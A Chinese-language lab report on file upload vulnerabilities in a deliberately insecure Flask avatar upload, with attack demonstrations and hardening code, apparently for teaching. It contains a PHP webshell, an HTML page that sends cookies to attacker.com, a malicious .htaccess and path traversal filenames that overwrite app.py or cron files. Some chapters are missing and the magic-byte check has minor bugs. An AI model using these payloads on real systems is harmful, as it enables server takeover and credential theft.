## 第一章：实验概述

### 1.1 实验目的

1. 理解**文件上传漏洞**的产生原理与常见攻击手法
2. 掌握使用 Burp Suite 和 curl 进行文件上传漏洞测试的方法
3. 学会识别不安全的文件上传实现中的 7 类典型漏洞
4. 掌握文件上传功能的**安全加固方案**（白名单校验、文件名消毒、内容检测等）
5. 建立文件上传功能的**纵深防御**思维

### 1.2 本次实验的功能背景

在之前已经完成的**登录、注册、搜索**功能基础上，本次新增了**用户头像上传**功能。该功能允许已登录用户上传图片文件作为头像。

**功能规范（故意保留的不安全写法）：**

| 项目 | 要求 |
|------|------|
| 文件保存路径 | `static/uploads/` |
| 文件名处理 | 使用用户上传的**原始文件名**，不重命名 |
| 文件类型检查 | **不检查**文件后缀名或 MIME 类型 |
| 文件校验函数 | **不调用**任何校验函数 |
| 文件大小限制 | 仅通过 `MAX_CONTENT_LENGTH = 16MB` 限制 |
| 访问权限 | 需登录才能上传（未登录跳转） |
| CSRF 防护 | 有（与登录/注册共用机制） |

这些故意保留的不安全写法，正是本次漏洞分析的基础。

## 第二章：文件上传漏洞基础理论

### 2.1 什么是文件上传漏洞？

文件上传漏洞（Unrestricted File Upload）是指 Web 应用程序在接收用户上传文件时，**没有对文件的内容、类型、大小和文件名进行充分的安全校验**，导致攻击者可以上传恶意文件至服务器，进而实施进一步攻击。

### 2.2 文件上传漏洞的危害路径

```
攻击者上传恶意文件
        │
        ▼
┌───────────────────┐
│ 1. WebShell 上传   │  →  服务器远程命令执行（RCE）
│    (.php/.jsp/.asp)│      完全控制服务器
└───────────────────┘
        │
┌───────────────────┐
│ 2. 存储型 XSS      │  →  所有访问该文件的用户受害
│    (.html/.svg)    │      Cookie 窃取、页面篡改
└───────────────────┘
        │
┌───────────────────┐
│ 3. 路径穿越        │  →  覆盖系统关键文件
│    文件名含 ../     │      导致服务瘫痪或代码执行
└───────────────────┘
        │
┌───────────────────┐
│ 4. 钓鱼页面        │  →  上传伪造的登录页面
│    (.html)         │      诱导用户输入凭据
└───────────────────┘
```

### 2.3 安全的文件上传应检查哪些内容

```
文件上传安全检查清单
┌────────────────────────────────────────────┐
│ 1. 文件扩展名验证（白名单）                  │
│    允许：.jpg .png .gif .webp               │
│    禁止：.php .exe .html .js .svg .htaccess │
├────────────────────────────────────────────┤
│ 2. 文件内容验证（MIME 类型检查）              │
│   检查 Content-Type 头                       │
│   读取文件头魔数（Magic Bytes）               │
├────────────────────────────────────────────┤
│ 3. 文件名消毒                                │
│   移除 ../ ./ 路径穿越字符                   │
│   使用 UUID/时间戳重命名                     │
│   过滤特殊字符                               │
├────────────────────────────────────────────┤
│ 4. 文件大小限制                              │
│   服务端限制 + 应用层限制                    │
├────────────────────────────────────────────┤
│ 5. 存储路径安全                              │
│   不要放在可执行目录                          │
│   存储在 Web 根目录外                        │
├────────────────────────────────────────────┤
│ 6. 上传频率限制                              │
│   同一用户单位时间内上传次数限制              │
├────────────────────────────────────────────┤
│ 7. 文件内容安全扫描                          │
│   使用 ClamAV 等杀毒引擎扫描                 │
└────────────────────────────────────────────┘
```

## 第三章：本次实现的头像上传功能分析

### 3.1 功能代码（`app.py` 第315-349行）

```python
@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    error = None
    uploaded_url = None

    if request.method == "POST":
        if not validate_csrf():
            abort(403, description="CSRF 验证失败")

        if "file" not in request.files:
            error = "没有选择文件"
        else:
            file = request.files["file"]
            if file.filename == "":
                error = "没有选择文件"
            else:
                try:
                    filename = file.filename               # 原始文件名，未消毒！
                    os.makedirs(UPLOAD_DIR, exist_ok=True)
                    file.save(os.path.join(UPLOAD_DIR, filename))  # 直接保存
                    uploaded_url = url_for("static", filename=f"uploads/{filename}")
                except Exception as e:
                    error = f"上传失败: {e}"

    return render_template("upload.html", error=error, uploaded=uploaded_url,
                           csrf_token=generate_csrf_token())
```

### 3.2 前端上传页面（`templates/upload.html`）

```html
<form method="post" action="/upload" enctype="multipart/form-data">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <div class="form-group">
        <label for="file">选择头像文件</label>
        <input type="file" id="file" name="file" class="file-input">
    </div>
    <button type="submit" class="btn btn-primary">上传</button>
</form>
```

### 3.3 配置项

```python
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16MB
UPLOAD_DIR = os.path.join(app.root_path, "static", "uploads")
```

### 3.4 安全缺陷汇总

| 缺陷 | 严重程度 | 说明 |
|------|---------|------|
| 无文件扩展名校验 | 严重 | 可以上传 `.php`、`.exe`、`.html` 等任何文件 |
| 无 MIME 类型检查 | 严重 | 不验证 `Content-Type`，也不验证文件头魔数 |
| 原始文件名直接保存 | 严重 | 文件名中的 `../` 可导致路径穿越 |
| 文件同名覆盖 | 高危 | 同文件名会静默覆盖已有文件 |
| 上传目录在 Web 根目录内 | 高危 | `static/` 目录下的所有文件可直接通过 URL 访问 |
| 无上传频率限制 | 中危 | 可无限次上传，消耗服务器磁盘空间 |
| 无文件大小前端限制 | 低危 | 仅靠服务端 16MB 限制，大文件上传消耗带宽 |

## 第四章：漏洞一 — 无文件类型限制（任意文件上传）

### 4.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 任意文件上传（Unrestricted File Upload） |
| 危害等级 | **严重Critical** — CVSS 9.0 |
| CWE 编号 | CWE-434: Unrestricted Upload of File with Dangerous Type |
| OWASP Top 10 | A03:2021 – Injection |
| 影响范围 | 头像上传接口 `POST /upload` |

### 4.2 漏洞代码分析

```python
# 问题代码 — 没有任何文件类型检查
file = request.files["file"]
filename = file.filename        # 直接取原始文件名
file.save(os.path.join(UPLOAD_DIR, filename))  # 直接保存
```

**缺少的安全校验：**
- 没有检查文件扩展名（如只允许 `.jpg`、`.png`、`.gif`）
- 没有检查 MIME `Content-Type`（如 `image/jpeg`）
- 没有读取文件头魔数（Magic Bytes）
- 没有调用任何文件校验函数

### 4.3 攻击复现 — POC 1：上传 PHP WebShell

**攻击目标：** 上传一个 PHP 一句话木马，获取服务器命令执行权限。

**前提条件：** 服务器需要支持 PHP 解析（本例仅做漏洞演示，实际 Flask + SQLite 环境不解析 PHP，但若配合 Nginx/Apache + PHP-FPM 则可执行）。

**攻击步骤：**

```bash
# 步骤1：创建恶意 PHP 文件（WebShell）
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# 步骤2：登录获取 CSRF Token 并上传
# （使用 Burp Suite 或 curl）

# 步骤3：访问上传后的文件执行命令
curl http://192.168.14.129:5000/static/uploads/shell.php?cmd=id
```

**如果服务器支持 PHP 解析：**
```bash
# 预期返回：
uid=0(root) gid=0(root) groups=0(root)  ← 服务器被完全控制
```

**严重性分析：**

```
上传 WebShell 的危害链：
上传 shell.php → 访问 shell.php?cmd=id → 获取服务器权限
    → 查看 /etc/passwd（用户枚举）
    → 下载数据库文件（数据泄露）
    → 上传反弹 Shell（完全控制）
    → 横向移动（攻击内网其他机器）
```

### 4.4 攻击复现 — POC 2：上传恶意 HTML（存储型 XSS）

**攻击目标：** 上传一个包含恶意 JavaScript 的 HTML 文件，当其他用户访问该文件时窃取其 Cookie。

**攻击步骤：**

```bash
# 步骤1：创建恶意 HTML 文件
cat > /tmp/steal_cookie.html << 'EOF'
<html>
<body>
<script>
// 窃取访问者的 Cookie 并发送到攻击者服务器
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
<h1>图片加载中...</h1>
</body>
</html>
EOF

# 步骤2：登录并上传
# 通过浏览器或 curl 上传这个 HTML 文件

# 步骤3：攻击者将恶意文件链接发送给其他用户
# http://192.168.14.129:5000/static/uploads/steal_cookie.html
```

**预期效果：** 任何访问该 URL 的用户，其 Cookie 都会被发送到攻击者的服务器。

### 4.5 攻击复现 — POC 3：上传 .htaccess 文件

**攻击目标：** 上传 `.htaccess` 文件改变服务器配置。

```bash
# 创建恶意 .htaccess 文件
cat > /tmp/.htaccess << 'EOF'
AddType application/x-httpd-php .jpg
EOF

# 上传后，同目录下的 .jpg 文件会被当做 PHP 执行
# 再上传一个包含 PHP 代码的 .jpg 文件即可执行命令
```

### 4.6 攻击验证结果

```bash
# 登录并上传不同类型的文件
curl -c /tmp/cookies.txt -X POST http://192.168.14.129:5000/login \
  -d "csrf_token=$(获取到的token)&username=admin&password=admin123"

# 上传 PHP 文件 ✅ 成功
curl -b /tmp/cookies.txt -X POST http://192.168.14.129:5000/upload \
  -F "csrf_token=$(新token)" -F "file=@/tmp/shell.php"

# 上传 HTML 文件 ✅ 成功
curl -b /tmp/cookies.txt -X POST http://192.168.14.129:5000/upload \
  -F "csrf_token=$(新token)" -F "file=@/tmp/steal_cookie.html"

# 上传 .htaccess 文件 ✅ 成功
curl -b /tmp/cookies.txt -X POST http://192.168.14.129:5000/upload \
  -F "csrf_token=$(新token)" -F "file=@/tmp/.htaccess"

# 验证文件是否可访问
curl -o /dev/null -w "HTTP %{http_code}\n" http://192.168.14.129:5000/static/uploads/shell.php
# 输出：HTTP 200  ← 文件可以被直接访问！
```

## 第五章：漏洞二 — 原始文件名保留（路径穿越）

### 5.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 路径穿越（Path Traversal） |
| 危害等级 | **严重Critical** — CVSS 8.6 |
| CWE 编号 | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| OWASP Top 10 | A01:2021 – Broken Access Control |

### 5.2 漏洞代码分析

```python
filename = file.filename        # ← 原始文件名未经任何消毒
file.save(os.path.join(UPLOAD_DIR, filename))  # ← 直接拼接路径
```

**问题：** 如果 `filename` 包含 `../` 路径穿越序列，`os.path.join()` 会将其解析为上级目录，导致文件被写入到 `static/uploads/` 目录之外的位置。

### 5.3 路径穿越攻击原理

```
正常保存路径：
  static/uploads/avatar.jpg    ← 文件在目标目录内

路径穿越保存路径：
  static/uploads/../../app.py  ← 穿越到项目根目录，覆盖 app.py！
                ↑  .. 回到 static/
            ↑  .. 回到项目根目录
```

**`os.path.join()` 在处理以 `/` 开头的路径时的特殊行为：**

```python
>>> import os
>>> os.path.join("/root/flask_user_app/static/uploads", "../../app.py")
'/root/flask_user_app/static/uploads/../../app.py'
# 实际对应：/root/flask_user_app/app.py
```

### 5.4 攻击复现 — POC 4：路径穿越覆盖关键文件

**攻击目标：** 通过路径穿越覆盖 `app.py` 文件，插入恶意代码。

```bash
# 创建包含恶意代码的 payload
echo 'import os; os.system("reboot")  # ' > /tmp/payload.txt

# 通过 Burp Suite 拦截请求，修改 filename 为 ../../app.py
# 或使用 curl（需要手动构造 multipart 请求）
```

**实际效果：**

| 原始文件名 | 实际写入路径 | 危害 |
|-----------|-------------|------|
| `avatar.jpg` | `static/uploads/avatar.jpg` | 正常 |
| `../../app.py` | `项目根目录/app.py` | **覆盖源代码！** |
| `../../templates/index.html` | `项目根目录/templates/index.html` | **篡改页面内容！** |
| `../../data/users.db` | `项目根目录/data/users.db` | **覆盖数据库！** |
| `../../../../etc/cron.d/malware` | `/etc/cron.d/malware` | **计划任务注入！** |

### 5.5 Windows 环境下的其他路径穿越方式

```
Windows 下的路径穿越方式：
  ..\..\app.py        ← 反斜杠穿越
  ....\....\app.py    ← 部分环境对 .... 的特殊解析
  ..%5c..%5capp.py    ← URL 编码的反斜杠
  ..%252f..%252fapp.py ← 双重 URL 编码
```

## 第六章：漏洞三 — 文件覆盖风险

### 6.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 文件覆盖（File Overwrite） |
| 危害等级 | **高危High** |
| CWE 编号 | CWE-183: Permissive List of Allowed Inputs |

### 6.2 漏洞分析

**问题代码：**

```python
file.save(os.path.join(UPLOAD_DIR, filename))  # 同名文件会静默覆盖
```

**问题说明：** 当上传的文件名与 `static/uploads/` 目录中已有文件同名时，`file.save()` 会**静默覆盖**已有文件，没有任何警告或提示。

### 6.3 攻击场景

```
场景1：覆盖其他用户的头像
  用户 A 上传了头像 avatar.jpg
  攻击者上传同名的 avatar.jpg（带恶意内容）
  → 用户 A 的头像被替换为恶意图片

场景2：覆盖关键静态文件
  上传名称为 css/style.css 的文件（利用路径穿越）
  → 覆盖网站样式文件，注入恶意内容

场景3：覆盖已上传的 WebShell
  攻击者多次上传同名的 shell.php
  → 每次上传都会覆盖之前的版本
  → 可用于更新或隐藏 WebShell
```

## 第七章：漏洞四 — 存储型 XSS（恶意 HTML/JS 上传）

### 7.1 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 存储型跨站脚本（Stored XSS） |

## 第十二章：文件上传漏洞防护方案

### 12.1 防护总览

```
                   文件上传安全防护体系

  第一层：文件类型白名单校验（核心防御）
  ──────────────────────────────────────
  只允许特定扩展名：.jpg .png .gif .webp
  禁止：.php .exe .html .js .svg .htaccess

  第二层：文件内容校验（辅助防御）
  ──────────────────────────────────────
  检查 MIME Content-Type
  读取文件头魔数（Magic Bytes）
  使用 Python-Magic 库检测真实文件类型

  第三层：文件名消毒（关键防御）
  ──────────────────────────────────────
  移除路径穿越字符 ../ ../

  第四层：存储安全（基础防御）
  ──────────────────────────────────────
```

### 12.2 代码修复方案

#### 修复一：文件扩展名白名单校验（`app.py`）

```python
# 允许上传的文件扩展名白名单
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp"}

import os

def allowed_file(filename):
    """检查文件扩展名是否在白名单中"""
    if "." not in filename:
        return False
    ext = os.path.splitext(filename)[1].lower()
    return ext in ALLOWED_EXTENSIONS
```

#### 修复二：文件名消毒与重命名

```python
import uuid

def safe_filename(filename):
    """生成安全的文件名：UUID + 原始扩展名"""
    if "." not in filename:
        return filename
    ext = os.path.splitext(filename)[1].lower()
    # 使用 UUID 生成唯一文件名，防止重名和路径穿越
    return f"{uuid.uuid4().hex}{ext}"
```

#### 修复三：文件内容校验（Magic Bytes）

```python
def validate_file_content(file_stream):
    """读取文件头魔数验证文件类型"""
    # 常见图片格式的魔数
    magic_bytes = {
        b"\xff\xd8\xff": "jpeg",       # JPEG
        b"\x89PNG": "png",             # PNG
        b"GIF89a": "gif",              # GIF
        b"GIF87a": "gif",              # GIF
        b"RIFF": "webp",               # WebP
    }
    
    header = file_stream.read(4)
    file_stream.seek(0)  # 重置文件指针
    
    for magic, img_type in magic_bytes.items():
        if header.startswith(magic):
            return True, img_type
    
    return False, None
```

#### 修复四：完整修复后的上传路由

```python
@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    error = None
    uploaded_url = None

    if request.method == "POST":
        # CSRF 校验
        if not validate_csrf():
            abort(403, description="CSRF 验证失败")

        if "file" not in request.files:
            error = "没有选择文件"
        else:
            file = request.files["file"]
            if file.filename == "":
                error = "没有选择文件"
            else:
                # 防护1：检查文件扩展名
                if not allowed_file(file.filename):
                    error = "不支持的文件类型，仅允许图片文件（jpg/png/gif/webp）"
                    return render_template(...)

                # 防护2：检查文件内容（魔数）
                valid, img_type = validate_file_content(file.stream)
                if not valid:
                    error = "文件内容不合法，请上传有效的图片文件"
                    return render_template(...)

                # 防护3：生成安全文件名
                safe_name = safe_filename(file.filename)

                # 防护4：检查文件大小（双重保障）
                file.seek(0, os.SEEK_END)
                size = file.tell()
                file.seek(0)
                if size > 5 * 1024 * 1024:  # 5MB
                    error = "文件大小不能超过 5MB"
                    return render_template(...)

                try:
                    os.makedirs(UPLOAD_DIR, exist_ok=True)
                    save_path = os.path.join(UPLOAD_DIR, safe_name)
                    file.save(save_path)
                    uploaded_url = url_for("static", filename=f"uploads/{safe_name}")
                except Exception as e:
                    error = f"上传失败，请稍后重试。"

    return render_template("upload.html", error=error, uploaded=uploaded_url,
                           csrf_token=generate_csrf_token())
```

| T9 | 文件大小 10MB | 提示太大 | 提示太大（5MB限制） | ✅ 限制更严 |

## 第十五章：总结与反思

### 15.1 实验核心收获

通过本次文件上传漏洞的分析与修复实践，掌握了以下核心知识：

**1. 文件上传漏洞的七种攻击手法**

```
漏洞类型                     攻击方式
────────────────────────────────────────────────────
任意文件上传       → 上传 WebShell、恶意脚本
路径穿越           → 文件名含 ../ 覆盖关键文件
文件覆盖           → 同名文件静默覆盖
存储型 XSS         → 上传 HTML/SVG 窃取 Cookie
无限制上传         → 耗尽磁盘空间（DoS）
CSRF + 重复提交    → 批量上传滥用
大小限制不完整     → 带宽消耗
```

**2. 安全上传的五个必须**

```
1. 必须限制文件扩展名（白名单，不是黑名单）
2. 必须验证文件内容（魔数 + MIME）
3. 必须消毒文件名（UUID 重命名，移除路径穿越字符）
4. 必须限制上传频率
5. 必须限制文件大小（前端 + 后端双重）
```

**3. 白名单 vs 黑名单的原则**

```
黑名单（不安全）：禁止 .php、.exe、.jsp...
  → 总有遗漏，如 .php5、.phtml、.shtml、.asp、.asa...

白名单（安全）：只允许 .jpg、.png、.gif...
  → 明确可接受的范围，没有遗漏
```

### 15.2 本次实验的关键数据

```
发现的漏洞总数：          7 个
已修复的漏洞数：          7 个（修复率 100%）
新增安全代码行数：        ~80 行
使用的安全机制：          5 种（白名单+魔数+UUID+限速+CSRF刷新）
漏洞等级分布：            2严重 + 2高危 + 2中危 + 1低危
```

### 15.3 Web 安全学习路径

```
第一阶段（已完成）：
  ┌────────────────────────────┐
  │ 密码安全修复（7个漏洞）    │
  │ SQL注入防护（参数化查询）  │
  │ CSRF防护 + Cookie安全      │
  └────────────────────────────┘

第二阶段（当前）：
  ┌────────────────────────────┐
  │ 文件上传漏洞（7个攻击面）   │
  │ 白名单 + 魔数 + UUID       │
  │ 限速 + 存储安全            │
  └────────────────────────────┘

第三阶段（可继续学习）：
  ┌────────────────────────────┐
  │ XSS 跨站脚本               │

  │ 反序列化漏洞               │
  └────────────────────────────┘
```

### 15.4 结束语

> **"永远不要相信用户上传的文件。文件名是假的，扩展名是假的，MIME 头是假的，文件内容也可能是假的。"**

文件上传功能是 Web 应用中最容易被忽视的攻击面之一。一个看似简单的头像上传功能，如果不做安全加固，可能成为攻击者控制整个服务器的入口。安全不是阻碍功能开发的障碍，而是确保功能可以长期稳定运行的基础。

## 第十六章：安全检查清单

### 16.1 文件上传安全检查清单

```
[ ] 是否使用了白名单机制限制文件扩展名？（而非黑名单）
[ ] 是否验证了文件内容的 Magic Bytes / 魔数？
[ ] 是否验证了 MIME Content-Type？
[ ] 是否对文件名进行了消毒处理（移除 ../ 等路径穿越字符）？
[ ] 是否使用 UUID 或时间戳重命名文件？
[ ] 是否限制了文件大小（前端 + 后端双重）？
[ ] 是否限制了上传频率？
[ ] 上传成功后是否刷新了 CSRF Token？
[ ] 文件是否存储在 Web 根目录之外？
[ ] 存储目录是否设置了不可执行权限？
[ ] 是否对上传文件进行了病毒/恶意软件扫描？
[ ] 错误信息是否没有暴露文件路径或内部细节？
[ ] 是否有日志记录上传操作（谁、什么时间、上传了什么文件）？
[ ] 是否有定期清理未使用文件的机制？
```

### 16.2 通用 Web 安全检查清单补充

```
[ ] 所有 POST 请求是否有 CSRF 防护？
[ ] Session Cookie 是否设置了 HttpOnly + SameSite？
[ ] 是否有输入验证（长度限制、字符过滤）？
[ ] Debug 模式是否已关闭？
[ ] 错误提示是否没有暴露敏感信息？
[ ] 密码是否使用哈希存储？
[ ] 所有 SQL 是否使用参数化查询？
[ ] 敏感接口是否有登录验证？
```
